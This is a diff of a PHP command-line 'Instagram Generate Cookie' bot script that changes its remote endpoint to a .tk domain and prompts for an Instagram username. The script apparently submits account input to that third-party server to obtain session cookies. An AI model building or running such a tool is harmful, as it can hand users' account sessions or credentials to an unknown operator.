@@ -1,6 +1,6 @@
 <?php
 $data=array('by'=>'tpbotz-teaM',
-           'url'=>'https://tpbotz-nelsa.tk/getData.php',
+           'url'=>'https://tpbotz-updated.tk/getData.php',
             );
 
 function Submit($url,$fields)
@@ -68,7 +68,7 @@ echo"\n\e[1;31m".$ikeh['message']."\n\e[37m";
 }else{
 
 echo"\n\e[1m\e[37mInstagram Generate Cookie Version".$ikeh['data']['sign_version']."";
-echo"\n\e[2;32mhttps://tpbotz-nelsa.tk";
+echo"\n\e[2;32mhttps://tpbotz-updated.tk";
 echo"\n\e[31mCode By Adarsh Tp\n";
 echo $likeh;
 echo"\n".$WH."? ".$OR."Insert Username : ";
